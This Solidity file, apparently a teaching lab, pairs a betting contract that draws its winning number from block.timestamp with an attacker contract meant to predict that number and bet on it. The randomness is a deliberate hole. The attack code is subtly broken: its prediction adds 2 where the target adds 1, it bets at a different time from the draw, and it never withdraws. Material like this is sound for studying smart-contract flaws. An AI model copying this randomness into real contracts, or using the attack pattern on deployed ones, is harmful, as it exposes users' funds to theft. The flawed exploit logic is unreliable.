// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

contract WeakRandomnessBet is Ownable {
    using Address for address payable;

    uint8 public winningNumber;
    mapping(address => uint8) public bets;
    bool public betsOpen;
    bool public prizeClaimed;

    constructor() {
        betsOpen = true;
    }

    function placeBet(uint8 number) external payable {
        require(betsOpen, "Bets are closed");
        require(msg.value == 1 ether, "Bet must be 1 ether");
        require(
            number >= 1 && number <= 100,
            "Number must be between 1 and 100"
        );
        require(bets[msg.sender] == 0, "You already placed a bet");

        bets[msg.sender] = number;
    }

    function closeBets() external onlyOwner {
        betsOpen = false;
        winningNumber = getRandomNumber();
    }

    function getRandomNumber() public view returns (uint8) {
        return uint8(uint256(block.timestamp) % 100) + 1;
    }

    function withdraw() external {
        require(!prizeClaimed, "Prize already claimed");
        require(bets[msg.sender] == winningNumber, "You didn't win");
        prizeClaimed = true;
        payable(msg.sender).sendValue(address(this).balance);
    }

    function getBetOf(address _address) external view returns (uint8) {
        return bets[_address];
    }

        function getWinningNumber() external view returns (uint8) {
        return winningNumber;
    }      
}

interface IWeakRandomnessBet {
    function placeBet(uint8 number) external payable;
}

contract WeakRandomnessBetAttack is Ownable {
    IWeakRandomnessBet private target;

    constructor(address _target) {
        target = IWeakRandomnessBet(_target);
    }

    function attack() external payable {
        target.placeBet{value: 1 ether}(getWinnning());
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getWinnning() private view returns (uint8) {
        return uint8(uint256(block.timestamp) % 100) + 2;
    }

 

    receive() external payable {}
}
